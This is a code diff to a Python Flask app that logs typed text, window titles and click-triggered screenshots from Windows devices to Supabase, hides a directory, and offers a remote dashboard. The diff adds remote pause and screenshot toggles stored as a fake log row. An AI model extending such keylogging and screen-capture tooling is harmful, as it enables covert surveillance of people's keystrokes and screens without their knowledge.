@@ -81,26 +81,37 @@ def register_device():
         print(f"Failed to register/upsert device in Supabase: {e}")
 
 is_monitoring_disabled = False
+disable_mouse_clicks = False
 
-def check_disabled_status_loop():
-    global is_monitoring_disabled
+def check_remote_config_loop():
+    global is_monitoring_disabled, disable_mouse_clicks
     if supabase is None:
         return
     device_id = get_device_id()
     while True:
         try:
-            res = supabase.table("devices").select("is_disabled").eq("device_id", device_id).execute()
+            res = supabase.table("activity_logs") \
+                .select("typed_text") \
+                .eq("device_id", device_id) \
+                .eq("window_title", "__DEVICE_CONFIG__") \
+                .limit(1) \
+                .execute()
             if res.data:
-                is_monitoring_disabled = res.data[0].get("is_disabled", False)
+                config = json.loads(res.data[0].get("typed_text", "{}"))
+                is_monitoring_disabled = config.get("is_disabled", False)
+                disable_mouse_clicks = config.get("disable_mouse_clicks", False)
+            else:
+                is_monitoring_disabled = False
+                disable_mouse_clicks = False
         except Exception as e:
-            print(f"Failed to check remote disabled status: {e}")
+            print(f"Failed to check remote config status: {e}")
         time.sleep(30)
 
 # Register local device on client startup (only if not running in SERVER_ONLY mode and running on Windows)
 server_only = os.getenv('SERVER_ONLY', 'false').lower() == 'true' or pynput is None or os.name != 'nt'
 if not server_only:
     register_device()
-    threading.Thread(target=check_disabled_status_loop, daemon=True).start()
+    threading.Thread(target=check_remote_config_loop, daemon=True).start()
 
 def hide_directory(path):
     """Sets a directory attribute to hidden in Windows (NT)."""
@@ -183,6 +194,25 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             --accent: #6366f1;
             --accent-hover: #4f46e5;
             --live: #10b981;
+        }
+
+        /* Switch Toggles Styles */
+        .switch input:checked + .slider {
+            background-color: var(--accent) !important;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .3s;
+            border-radius: 50%;
+        }
+        .switch input:checked + .slider:before {
+            transform: translateX(20px);
         }
         
         * {
@@ -763,8 +793,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     <select id="device-select" class="date-select" onchange="changeDevice(this.value)"></select>
                 </div>
                 <div class="date-selector-wrapper">
-                    <button onclick="promptRenameDevice()" style="background: none; border: none; color: var(--accent); font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0.25rem 0.5rem;" title="Rename Device">Rename</button>
-                    <button id="toggle-monitor-btn" onclick="toggleDeviceMonitoring()" style="background: none; border: none; color: var(--accent); font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0.25rem 0.5rem; margin-left: 0.25rem;" title="Pause/Resume Monitoring">Pause Logs</button>
+                    <button onclick="openSettingsModal()" style="background-color: var(--bg-card); border: 1px solid var(--border); color: var(--text-main); padding: 0.4rem 0.8rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.35rem; font-size: 0.85rem; font-weight: 600; transition: all 0.2s;" title="Device Settings">
+                        <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                        Settings
+                    </button>
                     <button id="purge-btn" onclick="purgeSelectedDateRange()" style="background: none; border: none; color: #ef4444; font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0.25rem 0.5rem; margin-left: 0.25rem;" title="Purge all logs & screenshots for selected timeframe">Purge Today</button>
                 </div>
                 <div class="date-selector-wrapper">
@@ -855,6 +887,55 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             <button id="modal-delete-btn" class="modal-delete-btn" onclick="deleteModalScreenshot()">Delete Screenshot</button>
         </div>
     </div>
+
+    <!-- Settings Modal -->
+    <div id="settings-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.75); z-index:2000; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
+        <div class="modal-content" style="background:var(--bg-card); border:1px solid var(--border); border-radius:12px; width:450px; max-width:90%; padding:1.5rem; box-shadow:0 8px 32px rgba(0,0,0,0.5);">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1.5rem; border-bottom:1px solid var(--border); padding-bottom:0.75rem;">
+                <h3 style="margin:0; font-size:1.15rem; color:var(--text-main);">Device Settings</h3>
+                <button onclick="closeSettingsModal()" style="background:none; border:none; color:var(--text-muted); cursor:pointer; font-size:1.25rem;">&times;</button>
+            </div>
+            
+            <div style="display:flex; flex-direction:column; gap:1.25rem;">
+                <div>
+                    <label style="display:block; font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem; font-weight:500;">Device ID</label>
+                    <input type="text" id="settings-device-id" disabled style="width:100%; background:var(--bg-main); border:1px solid var(--border); padding:0.5rem; border-radius:6px; color:var(--text-muted); font-size:0.9rem;">
+                </div>
+                
+                <div>
+                    <label style="display:block; font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem; font-weight:500;">Nickname</label>
+                    <input type="text" id="settings-nickname" style="width:100%; background:var(--bg-main); border:1px solid var(--border); padding:0.5rem; border-radius:6px; color:var(--text-main); font-size:0.9rem;">
+                </div>
+                
+                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:1rem;">
+                    <div>
+                        <div style="font-size:0.9rem; font-weight:600; color:var(--text-main);">Pause Monitoring</div>
+                        <div style="font-size:0.75rem; color:var(--text-muted);">Temporarily stop all logging and screenshots on this device</div>
+                    </div>
+                    <label class="switch" style="position:relative; display:inline-block; width:44px; height:24px;">
+                        <input type="checkbox" id="settings-is-disabled" style="opacity:0; width:0; height:0;">
+                        <span class="slider round" style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#374151; transition:.3s; border-radius:34px;"></span>
+                    </label>
+                </div>
+                
+                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:1rem; margin-bottom:1rem;">
+                    <div>
+                        <div style="font-size:0.9rem; font-weight:600; color:var(--text-main);">Disable Mouse Click Screenshots</div>
+                        <div style="font-size:0.75rem; color:var(--text-muted);">Disable rate-limited screenshot captures on mouse clicks</div>
+                    </div>
+                    <label class="switch" style="position:relative; display:inline-block; width:44px; height:24px;">
+                        <input type="checkbox" id="settings-disable-mouse" style="opacity:0; width:0; height:0;">
+                        <span class="slider round" style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#374151; transition:.3s; border-radius:34px;"></span>
+                    </label>
+                </div>
+            </div>
+            
+            <div style="display:flex; justify-content:flex-end; gap:0.75rem; border-top:1px solid var(--border); padding-top:1rem; margin-top:1rem;">
+                <button onclick="closeSettingsModal()" style="background:var(--bg-main); border:1px solid var(--border); color:var(--text-muted); padding:0.5rem 1rem; border-radius:6px; font-size:0.85rem; font-weight:600; cursor:pointer;">Cancel</button>
+                <button onclick="saveSettings()" style="background:var(--accent); border:none; color:#ffffff; padding:0.5rem 1rem; border-radius:6px; font-size:0.85rem; font-weight:600; cursor:pointer;">Save Changes</button>
+            </div>
+        </div>
+    </div>
     
     <script>
         let currentTab = localStorage.getItem('currentTab') || 'logs-tab';
@@ -940,44 +1021,105 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         function updateMonitoringButton() {
             const dev = allDevices.find(d => d.device_id === selectedDevice);
-            const btn = document.getElementById('toggle-monitor-btn');
-            if (!btn) return;
-            if (dev && dev.is_disabled) {
-                btn.innerText = "Resume Logs";
-                btn.style.color = "#ef4444"; // Red
-                btn.title = "Monitoring is currently paused. Click to resume.";
-            } else {
-                btn.innerText = "Pause Logs";
-                btn.style.color = "#3b82f6"; // Blue
-                btn.title = "Monitoring is active. Click to pause.";
+        }
+        
+        async function updateDeviceStatus() {
+            if (!selectedDevice) return;
+            try {
+                const res = await fetch(`/api/devices/config?device_id=${encodeURIComponent(selectedDevice)}`);
+                if (res.ok) {
+                    const config = await res.json();
+                    const d = allDevices.find(dev => dev.device_id === selectedDevice);
+                    const lastActiveDate = d ? new Date(d.last_active) : new Date();
+                    const isOnline = d ? (new Date() - lastActiveDate) < 120000 : false;
+                    
+                    const dot = document.getElementById('detail-live-dot');
+                    const txt = document.getElementById('detail-live-status-text');
+                    
+                    if (config.is_disabled) {
+                        dot.style.backgroundColor = '#f59e0b'; // Amber/Orange
+                        txt.innerText = 'MONITORING PAUSED';
+                    } else if (isOnline) {
+                        dot.style.backgroundColor = 'var(--live)';
+                        txt.innerText = 'ONLINE CONNECTED';
+                    } else {
+                        dot.style.backgroundColor = 'var(--text-muted)';
+                        txt.innerText = 'OFFLINE DISCONNECTED';
+                    }
+                }
+            } catch (err) {
+                console.error("Error updating device status UI:", err);
             }
         }
 
-        async function toggleDeviceMonitoring() {
+        async function openSettingsModal() {
             if (!selectedDevice) return;
-            const dev = allDevices.find(d => d.device_id === selectedDevice);
-            if (!dev) return;
-            const newStatus = !dev.is_disabled;
             
-            const confirmMsg = newStatus 
-                ? "Are you sure you want to PAUSE monitoring on this device? The laptop will stop capturing keystrokes and screenshots." 
-                : "Are you sure you want to RESUME monitoring on this device?";
-                
-            if (!confirm(confirmMsg)) return;
+            document.getElementById('settings-device-id').value = selectedDevice;
+            const d = allDevices.find(dev => dev.device_id === selectedDevice);
+            document.getElementById('settings-nickname').value = d ? (d.nickname || '') : '';
             
+            // Fetch configuration from server
             try {
-                const res = await fetch('/api/devices/toggle-monitoring', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: selectedDevice, is_disabled: newStatus })
-                });
+                const res = await fetch(`/api/devices/config?device_id=${encodeURIComponent(selectedDevice)}`);
                 if (res.ok) {
-                    await fetchDevices();
-                } else {
-                    alert("Failed to update monitoring status");
+                    const config = await res.json();
+                    document.getElementById('settings-is-disabled').checked = config.is_disabled || false;
+                    document.getElementById('settings-disable-mouse').checked = config.disable_mouse_clicks || false;
                 }
             } catch (err) {
-                console.error("Error toggling monitoring:", err);
+                console.error("Error fetching device config:", err);
+            }
+            
+            const modal = document.getElementById('settings-modal');
+            modal.style.display = 'flex';
+            setTimeout(() => {
+                modal.style.opacity = '1';
+                modal.style.pointerEvents = 'auto';
+            }, 50);
+        }
+        
+        function closeSettingsModal() {
+            const modal = document.getElementById('settings-modal');
+            modal.style.opacity = '0';
+            modal.style.pointerEvents = 'none';
+            setTimeout(() => {
+                modal.style.display = 'none';
+            }, 200);
+        }
+        
+        async function saveSettings() {
+            const nickname = document.getElementById('settings-nickname').value;
+            const isDisabled = document.getElementById('settings-is-disabled').checked;
+            const disableMouse = document.getElementById('settings-disable-mouse').checked;
+            
+            try {
+                // 1. Rename nickname if modified
+                await fetch('/api/devices/rename', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: selectedDevice, nickname: nickname })
+                });
+                
+                // 2. Save settings configuration
+                const res = await fetch('/api/devices/config', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        device_id: selectedDevice,
+                        is_disabled: isDisabled,
+                        disable_mouse_clicks: disableMouse
+                    })
+                });
+                
+                if (res.ok) {
+                    closeSettingsModal();
+                    await fetchDevices();
+                } else {
+                    alert("Failed to save configuration.");
+                }
+            } catch (err) {
+                console.error("Error saving settings:", err);
             }
         }
 
@@ -1000,7 +1142,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 
                 if (selectedDevice && devices.some(d => d.device_id === selectedDevice)) {
                     select.value = selectedDevice;
-                    updateMonitoringButton();
+                    updateDeviceStatus();
                 }
             } catch (err) {
                 console.error("Error fetching devices:", err);
@@ -1012,7 +1154,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             localStorage.setItem('selectedDevice', deviceId);
             selectedLogKeys.clear();
             selectedScreenshotFilenames.clear();
-            updateMonitoringButton();
+            updateDeviceStatus();
             fetchLogs();
             fetchScreenshots();
         }
@@ -1223,7 +1365,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             
             selectedLogKeys.clear();
             selectedScreenshotFilenames.clear();
-            updateMonitoringButton();
+            updateDeviceStatus();
             fetchLogs();
             fetchScreenshots();
         }
@@ -1686,6 +1828,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         function manualRefresh() {
             fetchDevices();
             if (selectedDevice) {
+                updateDeviceStatus();
                 fetchLogs();
                 fetchScreenshots();
             }
@@ -1859,7 +2002,8 @@ def purge_range():
                 # 1. Fetch screenshot filenames to delete from Storage
                 query = supabase.table("activity_logs") \
                     .select("screenshot_filename") \
-                    .eq("device_id", device_id)
+                    .eq("device_id", device_id) \
+                    .neq("window_title", "__DEVICE_CONFIG__")
                     
                 if not all_time:
                     query = query.gte("created_date", start_date).lte("created_date", end_date)
@@ -1884,7 +2028,8 @@ def purge_range():
                 # 2. Delete database rows
                 del_query = supabase.table("activity_logs") \
                     .delete() \
-                    .eq("device_id", device_id)
+                    .eq("device_id", device_id) \
+                    .neq("window_title", "__DEVICE_CONFIG__")
                     
                 if not all_time:
                     del_query = del_query.gte("created_date", start_date).lte("created_date", end_date)
@@ -1898,20 +2043,66 @@ def purge_range():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-@app.route('/api/devices/toggle-monitoring', methods=['POST'])
-def toggle_device_monitoring():
-    data = request.json
-    device_id = data.get("device_id")
-    is_disabled = data.get("is_disabled")
-    if not device_id or is_disabled is None:
-        return jsonify({"error": "Device ID and is_disabled flag required"}), 400
+@app.route('/api/devices/config', methods=['GET'])
+def get_device_config():
+    device_id = request.args.get("device_id")
+    if not device_id:
+        return jsonify({"error": "Device ID required"}), 400
         
     if supabase is not None:
         try:
-            supabase.table("devices").update({"is_disabled": is_disabled}).eq("device_id", device_id).execute()
+            res = supabase.table("activity_logs") \
+                .select("typed_text") \
+                .eq("device_id", device_id) \
+                .eq("window_title", "__DEVICE_CONFIG__") \
+                .limit(1) \
+                .execute()
+            if res.data:
+                config = json.loads(res.data[0].get("typed_text", "{}"))
+                return jsonify(config), 200
+        except Exception as e:
+            print(f"Failed to fetch device config: {e}")
+            
+    return jsonify({"is_disabled": False, "disable_mouse_clicks": False}), 200
+
+@app.route('/api/devices/config', methods=['POST'])
+def save_device_config():
+    data = request.json
+    device_id = data.get("device_id")
+    is_disabled = data.get("is_disabled", False)
+    disable_mouse_clicks = data.get("disable_mouse_clicks", False)
+    
+    if not device_id:
+        return jsonify({"error": "Device ID required"}), 400
+        
+    config = {
+        "is_disabled": is_disabled,
+        "disable_mouse_clicks": disable_mouse_clicks
+    }
+    
+    if supabase is not None:
+        try:
+            # 1. Clean up old configuration records for this device
+            supabase.table("activity_logs") \
+                .delete() \
+                .eq("device_id", device_id) \
+                .eq("window_title", "__DEVICE_CONFIG__") \
+                .execute()
+                
+            # 2. Insert new configuration record
+            supabase.table("activity_logs").insert({
+                "device_id": device_id,
+                "window_title": "__DEVICE_CONFIG__",
+                "typed_text": json.dumps(config),
+                "timestamp": datetime.now().isoformat(),
+                "created_date": datetime.now().strftime("%Y-%m-%d")
+            }).execute()
+            
             return jsonify({"status": "success"}), 200
         except Exception as e:
             return jsonify({"error": str(e)}), 500
+            
+    return jsonify({"error": "Supabase not configured"}), 500
             
     return jsonify({"error": "Supabase not connected"}), 400
 
@@ -1966,7 +2157,8 @@ def get_logs():
     if supabase is not None:
         try:
             query = supabase.table("activity_logs") \
-                .select("timestamp, window_title, typed_text, screenshot_url, screenshot_filename")
+                .select("timestamp, window_title, typed_text, screenshot_url, screenshot_filename") \
+                .neq("window_title", "__DEVICE_CONFIG__")
             
             if not all_time:
                 query = query.gte("created_date", start_date).lte("created_date", end_date)
@@ -2020,7 +2212,8 @@ def get_screenshots():
     if supabase is not None:
         try:
             query = supabase.table("activity_logs") \
-                .select("timestamp, window_title, screenshot_url, screenshot_filename")
+                .select("timestamp, window_title, screenshot_url, screenshot_filename") \
+                .neq("window_title", "__DEVICE_CONFIG__")
                 
             if not all_time:
                 query = query.gte("created_date", start_date).lte("created_date", end_date)
@@ -2575,12 +2768,13 @@ def handle_mouse_click_trigger():
         print(f"Error handling mouse click trigger: {e}")
 
 def on_click(x, y, button, pressed):
-    global last_activity_time
+    global last_activity_time, disable_mouse_clicks
     now = datetime.now()
     if pressed:
         last_activity_time = now
-        # Trigger rate-limited capture
-        handle_mouse_click_trigger()
+        if not disable_mouse_clicks:
+            # Trigger rate-limited capture
+            handle_mouse_click_trigger()
 
 def periodic_checker():
     global last_activity_time, last_screenshot_time, current_line
